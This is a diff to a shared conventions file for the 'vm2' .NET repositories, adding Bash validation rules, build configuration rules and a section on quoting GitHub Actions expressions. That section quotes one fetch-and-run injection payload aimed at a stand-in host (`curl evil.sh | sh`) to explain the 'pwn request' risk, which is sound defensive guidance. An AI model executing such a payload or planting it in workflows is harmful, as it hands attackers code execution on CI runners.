@@ -1,5 +1,43 @@
 # vm2 Shared Conventions
 
+<!-- TOC tocDepth:2..3 chapterDepth:2..6 -->
+
+- [vm2 Shared Conventions](#vm2-shared-conventions)
+  - [For AI Coding Assistants](#for-ai-coding-assistants)
+    - [Code Generation and File Editing](#code-generation-and-file-editing)
+    - [PR Review](#pr-review)
+    - [Language and Writing Quality](#language-and-writing-quality)
+  - [Project Structure](#project-structure)
+  - [Dependency Management](#dependency-management)
+  - [Bash](#bash)
+    - [Variables and Dynamic Scope](#variables-and-dynamic-scope)
+    - [Function Parameter Validation](#function-parameter-validation)
+    - [Argument-Dispatcher Precondition Ordering](#argument-dispatcher-precondition-ordering)
+    - [Long-Form Options in Script Bodies](#long-form-options-in-script-bodies)
+  - [General C# Coding Conventions](#general-c-coding-conventions)
+  - [Async](#async)
+  - [Services (if applicable)](#services-if-applicable)
+  - [Error Handling](#error-handling)
+    - [The `Do` / `TryDo` dual pattern](#the-do--trydo-dual-pattern)
+    - [`Result<T>` and railway-oriented programming (ROP)](#resultt-and-railway-oriented-programming-rop)
+    - [API surface vs. inner workings](#api-surface-vs-inner-workings)
+  - [Testing](#testing)
+  - [Performance Benchmarks](#performance-benchmarks)
+  - [Performance](#performance)
+  - [Security](#security)
+  - [Naming](#naming)
+  - [AOT and Trimming](#aot-and-trimming)
+  - [Git and PR Hygiene](#git-and-pr-hygiene)
+  - [Documentation](#documentation)
+  - [References](#references)
+    - [Markdown](#markdown)
+  - [File Modification](#file-modification)
+  - [CI / GitHub Actions](#ci--github-actions)
+    - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
+  - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)
+
+<!-- /TOC -->
+
 The *vm2* family of repositories (packages, solutions, etc.) **share a common set of conventions** for the directory
 structure, project structure, coding style, documentation style, Git and PR hygiene, and more. This file documents these
 shared conventions to ensure **consistency across all repositories** and to provide guidance for contributors.
@@ -82,6 +120,123 @@ The project owner is a non-native English speaker.
 - **Build with `dotnet restore --use-lock-file ... && dotnet build --no-restore ...`**
 - When dependencies change: update `Directory.Packages.props`, **AND** then run `dotnet restore --force-evaluate`, commit both files
 - Dependabot watches `Directory.Packages.props`; after merging a Dependabot PR, run `dotnet restore --force-evaluate` (also done by `RefreshLockFiles.yaml` and `AutoMerge.yaml`)
+
+## Bash
+
+### Variables and Dynamic Scope
+
+- Function-local variable names MUST begin with `_`. Bash uses dynamic scope: a called function can read and modify the
+  caller's locals unless it declares a local variable with the same name. The prefix reduces accidental collisions with
+  globals and environment variables; it does not eliminate collisions between functions.
+- A nameref (`local -n`) MUST have a name distinct from the target name and from locals in callers that may be visible
+  through dynamic scope. In particular, a function receiving a target variable name MUST NOT give its nameref the same
+  name commonly used by callers; that can create a circular nameref.
+- Validate a variable name before creating a nameref to it. Create the nameref only after the parameter-validation gate.
+- When iterating over variable names, use indirect expansion (`${!_name}`) rather than assigning successive targets to a
+  nameref declared outside the loop. Assigning to such a nameref writes through to its current target; it does not
+  reliably re-target the reference.
+- Remember that the left side of a pipeline executes in a subshell. A function that mutates a variable through a nameref
+  MUST run in the current shell; pass input through redirection or process substitution instead of piping into it.
+
+### Function Parameter Validation
+
+Reusable functions MUST accumulate all useful parameter errors and pass one validation gate before business logic:
+
+```bash
+function example()
+{
+    local -i _rc="$success"
+
+    (( $# == 1 || $# == 2 )) || {
+        _rc="$err_invalid_arguments"
+        error -ec "$_rc" "${FUNCNAME[0]}() requires one or two arguments (provided $#)."
+    }
+    [[ -v 1 && -n $1 ]] || {
+        _rc="$err_argument_value"
+        error -ec "$_rc" "${FUNCNAME[0]}() requires argument 1, the input name, to be non-empty (provided '${1-<missing>}')."
+    }
+    [[ ! -v 2 || $2 =~ ^(true|false)$ ]] || {
+        _rc="$err_argument_type"
+        error -ec "$_rc" "${FUNCNAME[0]}() requires optional argument 2 to be 'true' or 'false' (provided '${2-<missing>}')."
+    }
+
+    (( _rc == success )) || return "$err_invalid_arguments"
+
+    local _input=$1
+    local _flag=${2:-false}
+    # business logic
+}
+```
+
+- Check overall arity separately with `$#`. Do not return immediately after the arity check: report independently useful
+  errors for missing or invalid arguments as well.
+- Test a required positional parameter with `[[ -v N && predicate ]]`. Test an optional parameter with
+  `[[ ! -v N || predicate ]]`. The existence check MUST precede expansion of `$N`, so validation remains safe under
+  `set -u`.
+- Commands cannot be invoked inside `[[ ... ]]`. Guard command predicates explicitly, for example:
+  `[[ -v 1 ]] && is_defined_array "$1" || { ...; }`.
+- Each failed check MUST log the specific applicable error code (`$err_argument_type`, `$err_argument_value`,
+  `$err_invalid_nameref`, and so on). After all checks, the validation gate MUST return the generic
+  `$err_invalid_arguments`, so callers need only one sentinel for a bad call.
+- Error messages MUST identify the argument number, its role, and the expected constraint. Render a possibly absent
+  value with `${N-<missing>}`; never expand an unguarded positional parameter merely to report an error.
+- Do not assign required positional parameters to locals, create namerefs, or perform business logic before the gate.
+- Validation of global or environment state is a precondition check, not argument validation. It MAY use the same
+  accumulate-then-gate shape, but MUST return the code that describes the failed precondition, commonly
+  `$err_logic_error`, rather than `$err_invalid_arguments`.
+- A parser that consumes arguments with `shift` MAY use multiple validation gates, one before each dependent phase.
+- Top-level CLI parsers and configuration functions that intentionally terminate through `usage()` or
+  `exit_if_has_errors()` MUST retain that process-exit behavior. They SHOULD accumulate errors with `error` calls and
+  invoke the exit gate once; do not convert them into reusable return-based functions.
+
+### Argument-Dispatcher Precondition Ordering
+
+Bash argument parsers commonly chain several optional handlers, each claiming the tokens it recognizes and returning
+failure for the rest, so the caller can fall through to the next one (e.g. a script's own `case` block trying
+`get_common_arg`, then a shared `get_common_*_arg`, then its own options). In this shape:
+
+- **Determine applicability before validating shape.** A handler MUST decide whether an option belongs to it (a
+  `case`/pattern match on the option's *name*) before it inspects or requires anything about the option's *value*.
+  Checking a value's presence or format ahead of that membership check makes the handler misfire on inputs that were
+  never meant for it — for example, an ordinary positional argument that happens to be the last token on the command
+  line gets treated as "my option, and its value is missing," when it is not this handler's option at all.
+- A handler in this chain has exactly one legitimate way to say "not mine": return failure without touching the
+  value or any option-specific state. It has exactly one legitimate way to say "mine, but malformed": having matched
+  the option name, *then* validate the value and report a specific, actionable error.
+- When adding or removing a value-taking option from such a dispatcher, also update any downstream no-op reservation
+  list (a `case` arm like `-a|-c|-f|... ) ;;` that exists purely to reserve those letters/names so a later `case` arm
+  in the same function does not shadow the shared handler). A stale reservation silently swallows a letter the shared
+  handler no longer claims, or fails to reserve one it newly does.
+
+### Long-Form Options in Script Bodies
+
+When a script or function invokes another vm2.DevOps script or library function that itself accepts an option, use
+the option's **long form** (`--verbose`, `--header`, `--configuration`) in the checked-in call, not its short alias
+(`-v`, `-h`, `-c`). A long-form flag is self-documenting at the call site — a reader does not need to look up what
+`-md` means the way they might need to for `--markdown`. Short forms exist for fast, interactive, one-off terminal
+use, where brevity outweighs at-a-glance clarity; that tradeoff does not hold for a call site that is read far more
+often than it is typed.
+
+```bash
+# Preferred: long-form options make the call self-explanatory
+dump_vars --force --quiet --header "Arguments for $script_name:" package_project reason
+
+# Avoid: short forms make the reader go look up what -f/-q/-h mean
+dump_vars -f -q -h "Arguments for $script_name:" package_project reason
+```
+
+**Exception: the `message()`-family functions** (`error`, `warning`, `info`, `trace`, `bug`, `usage`,
+`exit_with_error`, `fatal_exit`). Their own options — `--error-code`/`-ec`, `--stack-depth`/`-sd`,
+`--no-stack`/`-ns`, `--stack-skip`/`-ss` — are used in **short** form throughout the codebase, by established
+convention: these calls appear at essentially every validation and error-reporting site in every script, and the
+short forms keep them visually compact, so the part that actually matters at each call site — the message text —
+stays the most prominent thing on the line.
+
+```bash
+# Exception: message()-family functions keep their short forms
+error -ec "$err_argument_value" "Bad commit message: $subject"
+usage -ec "$_rc" -sd 3 "Invalid argument value for the option <option_name>"
+```
 
 ## General C# Coding Conventions
 
@@ -351,8 +506,9 @@ rationale in README/CHANGELOG/PR.
   avoid unexplained placeholders. A reader must be able to paste the example and have it compile
 - Standard references block:
 
-      ## References
-      - [Title](URL) — Author or organization
+## References
+
+- [Title](URL) — Author or organization
 
 ### Markdown
 
@@ -391,6 +547,68 @@ When adding a new project, register it in `.github/workflows/CI.yaml`:
 | `PACKAGE_PROJECTS`   | Projects to pack as NuGet packages    |
 
 Also add the project to the `.slnx` solution file under the appropriate folder.
+
+### Quoting GitHub Actions Expressions in Shell Steps
+
+GitHub substitutes a `${{ ... }}` expression as literal text **before** the shell parses the line — the shell never
+sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
+security boundary, not a style choice:
+
+- **Single-quote `'${{ ... }}'` by default** in `run:` shell blocks. Single quotes make the substituted text fully
+  literal to bash, whatever it contains.
+- **Double-quoting `"${{ ... }}"` is a code-injection risk.** Bash still evaluates `$()`/backtick command
+  substitution inside double quotes, so if the substituted value ever contains one (`$(curl evil.sh | sh)`), it
+  executes. This is the "pwn request" pattern: an expression whose value an attacker can influence through untrusted
+  input (a fork PR's `github.head_ref`, a PR or issue title, a commit message) becomes a way to run arbitrary code in
+  the workflow's context. Most `${{ }}` values in this codebase are not attacker-influenced (`github.repository`,
+  `secrets.*`, computed job outputs), but the single-quote default costs nothing on those and removes the need to
+  reason about it case by case.
+- **Exception: concatenation with a live shell variable or string** (e.g.
+  `preprocessor_symbols="$preprocessor_symbols;${{ inputs.dispatch-preprocessor-symbols }}"`). The whole expression
+  cannot be single-quoted without losing `$preprocessor_symbols`'s expansion. Document why the exception applies at
+  the call site (see the top-level rule in this document about documenting deviations), and prefer capturing the
+  `${{ }}` value into its own single-quoted variable first when that keeps the risk narrower than an inline
+  concatenation.
+- **A `${{ }}` value already inside another language's quoting context follows that language's syntax, not this
+  rule.** For example, a `jq` filter passed as `--jq 'map(select(.headRefName == "${{ github.ref_name }}")) | ...'`
+  needs double quotes around the expression because `jq` string literals require them — `jq` has no single-quoted
+  string syntax. The outer single quotes around the whole `--jq '...'` argument already make it literal to bash;
+  changing the inner quotes would break `jq`'s own parsing without improving security.
+
+## Build Configuration, TFMs, RIDs, and Preprocessor Symbols
+
+- **`Directory.Build.props` is the single source of truth for `TargetFramework` and the artifacts layout**
+  (`ArtifactsPath`, `UseArtifactsOutput`). Workflows and scripts MUST NOT duplicate or override these — they read
+  build output locations, they do not decide them. This extends to every CLI flag and environment variable that
+  threads one of these build-controlled values through a script (`--configuration`/`CONFIGURATION`,
+  `--framework`/`FRAMEWORK`, `--runtime`/`RUNTIME`, `--artifacts-path`/`ARTIFACTS_PATH`, and any
+  `dotnet-version`/`target-framework` workflow input): these exist as escape valves for a rare, deliberate exception,
+  not as a general-purpose override mechanism. If a script or workflow ends up setting one of these to something
+  other than its resolved default, that MUST be justified in writing — a comment at the override site, or the PR
+  description — not merely "because the parameter is there." `Configuration`'s own narrow exception (below) is the
+  model to follow: a named, human-triggered escape hatch with a stated reason, not a value CI computes or forwards by
+  default. Conversely, an input or CLI flag that no caller ever sets to anything but the default is not a reserved
+  knob — it is dead weight that has silently drifted from what the workflow actually does; remove it rather than
+  leave it standing.
+- **The Runtime Identifier (RID) is deliberately left unset (`""`) today.** Every package builds portable,
+  framework-dependent, OS/architecture-agnostic output — no `RuntimeIdentifier` is set anywhere, and the
+  `runtime-identifier` workflow input exists but defaults to unspecified. This is why `runner-os` (and the
+  `runners-os` matrix in `_ci.yaml`) currently only selects which OS *runs* the build/test/benchmark step; it has no
+  effect on the artifact itself, since the output is the same regardless of runner. The input exists precisely so
+  this can change later: **when AOT publishing is introduced, RID becomes mandatory and MUST be derived from the
+  runner**, not hardcoded once for all of them (e.g. `ubuntu-latest` → `linux-x64`, `windows-latest` → `win-x64`,
+  `macos-latest` → `osx-arm64`). Treat `runner-os` as the future RID axis already in place, waiting for AOT to need
+  it.
+- **`Configuration` defaults to `Release`.** Workflow logic MUST NOT branch on or override `Configuration`; it is a
+  manual/CLI override knob (`workflow_dispatch`, local `dotnet build -c ...`) for the rare case a human needs a
+  Debug build, not something CI decides automatically. There is currently no scenario that justifies CI choosing
+  anything else.
+- **Keep the number of CI-driven preprocessor symbols to a minimum.** Today there is exactly one: `SHORT_RUN`,
+  auto-defined by `Directory.Build.props` for local benchmark builds and added explicitly in CI only for a `push` to
+  a non-main branch with no open PR yet (a faster, less comprehensive benchmark run; the PR-triggered run does the
+  full one). Every other CI path (`pull_request`, `workflow_dispatch`, `push` to `main`) leaves
+  `preprocessor-symbols` empty. Adding a new symbol is a deliberate ecosystem-wide decision, not a per-repo
+  convenience — propose it here first.
 
 ---
 *Canonical source: `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`*
